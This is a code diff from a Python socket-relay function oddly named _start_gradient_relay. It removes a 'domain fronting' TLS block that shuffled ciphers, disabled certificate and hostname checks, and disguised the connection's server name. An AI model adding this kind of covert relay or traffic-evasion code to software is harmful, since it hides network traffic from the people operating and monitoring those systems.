@@ -194,16 +194,7 @@ def _start_gradient_relay(target_ip: str, target_port: int) -> int:
             remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             remote.settimeout(30)
             
-            # Domain fronting TLS setup
-            ctx = ssl.create_default_context()
-            ciphers = _S("tls_ciphers").copy()
-            random.shuffle(ciphers)
-            ctx.set_ciphers(":".join(ciphers))
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl.CERT_NONE
-            
             remote.connect((target_ip, target_port))
-            remote = ctx.wrap_socket(remote, server_hostname=_S("cf_front_host"))
             remote.settimeout(None)
             
             pair = [client_sock, remote]
